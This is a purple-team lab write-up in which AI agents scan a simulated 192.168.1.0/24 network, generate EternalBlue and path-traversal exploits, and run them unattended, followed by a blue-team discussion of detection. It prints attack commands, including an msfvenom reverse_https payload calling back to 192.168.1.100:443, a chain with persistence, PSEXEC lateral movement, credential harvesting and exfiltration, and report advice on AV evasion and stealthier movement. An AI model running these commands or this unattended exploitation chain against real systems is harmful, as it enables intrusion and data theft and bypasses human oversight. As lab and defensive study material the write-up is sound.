# GrayOS – Day 25 Lab PoC
Advanced Exploitation with MetasploitMCP

**Analyst:** Jnanashree Anchan | **Date:** 15 October 2026

---

This lab runs an AI-driven exploitation workflow end to end against a simulated network (192.168.1.0/24), where an AI agent selects targets, generates exploits, and executes them autonomously, with a human reviewing and validating its decisions. It chains MetasploitMCP for AI recon, exploit generation and autonomous exploitation, KALI-MCP for AI-driven tool execution, shell-gpt for analysis and validation, and Nighthawk to orchestrate a full attack chain, then closes with human review and a report. Documented as a purple-team exercise focused on a question the blue side now has to answer: what does AI-automated attack look like, and where does the human stay in the loop.

---

## Key Findings

An AI agent autonomously recon'd, generated exploits for, and compromised two targets to high privilege, then a human validated the chain and flagged where it was noisy, which is the human-in-the-loop control this exercise is really about.

- **AI target selection:** MetasploitMCP (AI mode) scanned 192.168.1.0/24, found 12 hosts, and prioritised 192.168.1.50 (SMB, likely EternalBlue) and 192.168.1.55 (HTTP, CVE-2026-59310) at 89% exploitation confidence.
- **AI exploit generation:** the agent generated modules for CVE-2026-59310 (vCenter path traversal, 92%) and CVE-2017-0144 (EternalBlue, 95%), plus a lower-confidence Log4j module.
- **Autonomous exploitation:** the AI executed both exploits unattended, opening a SYSTEM meterpreter session on 192.168.1.50 and a root session on 192.168.1.55.
- **Automated chain:** Nighthawk planned and executed a 7-step full chain (recon, exploit, persistence, lateral movement, exfiltration) compromising 3 hosts, with PSEXEC lateral movement caught by AV.
- **Human validation:** shell-gpt review confirmed the chain was effective (85%), with the PSEXEC step flagged as detected and the recommendation to use stealthier lateral movement.

IOCs: attacker host 192.168.1.100, targets 192.168.1.50 / 192.168.1.55 / 192.168.1.60, payload.exe (reverse_https to 192.168.1.100:443), the generated EternalBlue and path-traversal modules, and the scheduled-task and admin-user persistence.

---

## Key Concepts

| Term / Concept | Description |
|---|---|
| MetasploitMCP | AI-powered Metasploit that generates and executes exploits autonomously. |
| KALI-MCP | Runs any Kali tool via AI, with no command whitelisting. |
| shell-gpt (sgpt) | AI command generation for exploitation and reporting. |
| Nighthawk | AI orchestrator that automates complete exploitation workflows. |
| Autonomous Exploitation | AI selects targets, generates exploits, and executes them without human input. |
| Human-in-the-Loop | A human reviewing and validating the AI's decisions to ensure accuracy and safety. |

---

# Phase 1 – AI Reconnaissance & Target Selection

Step 1: Let the AI agent scan and select targets, then review its decisions.

**Command:** `msf-mcp recon --target 192.168.1.0/24 --ai`

**Command:** `msf-mcp scan --target 192.168.1.50 --ports 1-65535 --ai`

**Command:** `sgpt "Analyze 192.168.1.50 for vulnerabilities"`

<img src="screenshots/phase1-01-ai-recon.png" alt="AI recon, scan, and vulnerability analysis" height="324">

Lets the AI agent find and prioritise targets. MetasploitMCP v3.0.0 (AI mode) scans 192.168.1.0/24, discovers 12 hosts, and recommends 192.168.1.50 (SMB, possible EternalBlue) and 192.168.1.55 (HTTP, possible CVE-2026-59310). The focused scan of 192.168.1.50 finds ports 445, 139, 80, and 443 open and rates EternalBlue likely at 89% confidence, and shell-gpt confirms CVE-2017-0144 (EternalBlue) and CVE-2026-59310 (path traversal) as the critical findings. The human reviews these AI picks before anything is exploited.

---

# Phase 2 – AI-Driven Exploit Generation

Step 2: The AI generates exploits for the identified vulnerabilities.

**Command:** `msf-mcp generate --cve CVE-2026-59310 --ai`

**Command:** `msf-mcp generate --cve CVE-2017-0144 --ai`

**Command:** `msf-mcp show --generated --ai`

<img src="screenshots/phase2-01-ai-generate.png" alt="AI generating exploit modules" height="360">

Has the AI build the exploit modules. It generates a Linux/x64 HTTP path-traversal module for CVE-2026-59310 (vcenter_path_traversal_rce, 92% confidence) and a Windows/SMB module for CVE-2017-0144 (ms17_010_eternalblue, 95%). The generated list shows three modules in total, including a lower-confidence Log4j (CVE-2021-44228, 78%) exploit, with two rated high confidence.

---

# Phase 3 – Autonomous Exploitation with MetasploitMCP

Step 3: The AI autonomously executes the exploits and obtains shells.

**Command:** `msf-mcp exploit --cve CVE-2017-0144 --target 192.168.1.50 --auto`

**Command:** `msf-mcp exploit --cve CVE-2026-59310 --target 192.168.1.55 --auto`

**Command:** `msf-mcp sessions --list --ai`

<img src="screenshots/phase3-01-ai-exploit.png" alt="AI autonomously exploiting both targets" height="486">

Runs the exploits unattended. Against 192.168.1.50 the AI picks windows/x64/meterpreter/reverse_https, sets RHOSTS and LHOST itself, and opens meterpreter session 1 with SYSTEM privileges. Against 192.168.1.55 it uses linux/x64/meterpreter/reverse_tcp and opens session 2 with root. The session list confirms two active high-privilege meterpreter sessions. This is the autonomous step where the AI makes and acts on exploitation decisions without a human in the moment, which is exactly what the Phase 5 review exists to check.

---

# Phase 4 – KALI-MCP & Nighthawk Automation

Step 4: Use KALI-MCP to execute Kali tools and Nighthawk to orchestrate full attack chains.

**Command:** `kali-mcp --execute "nmap -p 445 192.168.1.50" --ai`

**Command:** `kali-mcp --execute "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o payload.exe" --ai`

<img src="screenshots/phase4-01-kali-mcp.png" alt="KALI-MCP running nmap and msfvenom via AI" height="234">

Drives Kali tools through the AI. KALI-MCP v1.0.0 runs an nmap check confirming port 445 open on 192.168.1.50, then generates payload.exe (72 KB) with msfvenom, a reverse_https payload calling back to 192.168.1.100:443, saved to /tmp/payload.exe. The AI chooses the payload and parameters itself.

**Command:** `nighthawk plan --cve CVE-2026-59310 --target 192.168.1.55 --strategy full_chain`

**Command:** `nighthawk execute --plan full_chain_cve_2026_59310.json --ai`

<img src="screenshots/phase4-02-nighthawk.png" alt="Nighthawk planning and executing the full chain" height="378">

Orchestrates the complete chain. Nighthawk v4.0.0 identifies 192.168.1.55 as a vCenter server and plans a five-phase chain (recon, exploitation, persistence, lateral movement, exfiltration) saved to full_chain_cve_2026_59310.json. Executing it runs 7 steps, from recon through scheduled-task and admin-user persistence, PSEXEC lateral movement to 192.168.1.60, credential harvesting, and data exfiltration, compromising 3 hosts.

---

# Phase 5 – Human Review & Report Submission

Step 5: Review the AI's decisions, validate the exploitation chain, and submit the report.

**Command:** `sgpt "Validate AI exploit chain for CVE-2026-59310"`

<img src="screenshots/phase5-01-sgpt-validate.png" alt="Human-in-the-loop validation of the AI chain" height="162">

Runs the human-in-the-loop validation. shell-gpt walks the chain and verifies recon, exploitation, persistence, and exfiltration as correct, but flags the PSEXEC lateral movement as detected by AV, recommending a review of that approach for stealth. This is the control step: a human confirms the AI's decisions were right and catches where it was noisy.

**Command:** `cat > day25_ai_exploit_report.md`

<img src="screenshots/phase5-02-report.png" alt="Writing the AI exploitation report" height="432">

Writes the AI exploitation report: the summary (the AI autonomously exploited CVE-2026-59310 and CVE-2017-0144, human-validated), the AI decisions reviewed (target, payload, exploit, persistence all approved, PSEXEC lateral movement flagged as detected), the findings, and the recommendations, use stealthier lateral movement (WMI, WinRM), obfuscate the payload for AV evasion, and add sleep timers between steps. Human validation rates the chain 85% effective and the AI's decisions logical and contextually appropriate.

**Command:** `tar -czvf day25_evidence.tar.gz day25_ai_exploit_report.md msf_mcp_logs/ nighthawk_plans/ generated_exploits/ payload.exe sessions.log`

**Command:** `sha256sum day25_evidence.tar.gz`

<img src="screenshots/phase5-03-tar-sha256.png" alt="Archiving and hashing the evidence" height="160">

Packages the evidence, the report, the MetasploitMCP logs, the Nighthawk plans, the generated exploits, the payload, and the session log, into a tarball and hashes it. The archive SHA-256 is a valid 64-character digest for integrity.

---

# Summary

| Phase | Action Taken | Tools | Attacker Goal |
|---|---|---|---|
| 1. AI Reconnaissance & Target Selection | AI scanned the subnet and prioritised two targets | MetasploitMCP, shell-gpt | Let the AI pick the best targets |
| 2. AI-Driven Exploit Generation | AI generated exploit modules for the chosen CVEs | MetasploitMCP | Auto-build working exploits |
| 3. Autonomous Exploitation | AI executed both exploits and opened SYSTEM and root sessions | MetasploitMCP | Compromise the targets unattended |
| 4. KALI-MCP & Nighthawk Automation | AI ran Kali tools and orchestrated a 7-step full chain | KALI-MCP, Nighthawk | Automate the full attack workflow |
| 5. Human Review & Report Submission | Human validated the chain, flagged the noisy step, and reported | shell-gpt, cat, tar, sha256sum | Keep a human in the loop and document |

This lab is less about the individual exploits, which are familiar (EternalBlue, a path-traversal RCE), and more about the shift it demonstrates: an AI agent ran the whole loop, target selection, exploit generation, execution, and a full orchestrated chain, with the human stepping in only to review. Read as a blue team, that changes the threat model in two directions. The attacks themselves still leave the same detectable signals this portfolio has documented all week: EternalBlue SMB traffic (MS17-010), reverse_https callbacks to an attacker host, scheduled-task and admin-user persistence (4698, 4720), and PSEXEC lateral movement, which here AV actually caught. The new part is speed and scale: an AI can run this chain in minutes across a subnet, so defenses that assume a human-paced attacker, slow enough to spot between steps, lose that margin. The defensive takeaways the report itself lands on are the right ones in reverse: if attackers add sleep timers and swap PSEXEC for WMI or WinRM to evade, then behavioral detection, not single-signature matching, is what holds up, and the human-in-the-loop review is the reminder that an autonomous agent's decisions still need a human to catch what it gets wrong, on both sides of the line.
